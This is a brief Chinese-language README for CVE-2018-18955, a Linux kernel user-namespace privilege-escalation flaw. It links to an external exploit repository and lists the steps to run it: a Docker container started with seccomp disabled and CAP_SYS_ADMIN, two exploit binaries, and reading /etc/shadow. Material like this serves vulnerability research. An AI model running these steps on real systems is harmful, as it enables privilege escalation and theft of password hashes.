# CVE-2018-18955
## Description
在4.19.2之前的Linux内核4.15.x到4.19.x中，kernel/user_namespace.c中的map_write()允许提权，因为它错误地处理了具有超过5个UID或GID范围的嵌套用户命名空间。在受影响的用户命名空间中拥有CAP_SYS_ADMIN的用户可以绕过对命名空间外资源的访问控制，如read /etc/shadow。发生这种情况是因为ID转换对命名空间到内核方向正确进行，而不是对内核到命名空间方向进行。

## Exploits
See: https://github.com/duowen1/Container-escape-exps/tree/main/CVE-2018-18955

构建容器
```shell
docker build -t pod .
docker run -it --rm --security-opt seccomp=unconfined --cap-add sys_admin poc
```
在容器中
```shell
./subuid_shell
./subshell
cat /etc/shadow
```
> 该漏洞只能在容器内提权，因为不能绕过namespace的限制。